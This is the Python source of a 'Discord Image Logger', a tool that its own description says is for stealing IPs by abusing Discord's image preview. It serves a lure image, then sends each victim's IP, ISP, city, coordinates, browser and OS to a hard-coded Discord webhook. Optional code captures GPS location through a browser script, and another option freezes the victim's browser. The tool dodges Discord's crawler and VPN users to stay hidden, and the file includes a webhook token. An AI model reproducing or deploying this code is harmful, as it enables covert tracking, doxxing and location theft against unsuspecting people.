# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1170939836576845897/oc9QzV9wJ4fX2yzuzNAN_V5ghabcv-pHYpLQnAZbXuLsJQ8_h3ERBaF8ot-o845P3eS5",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Jeff", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
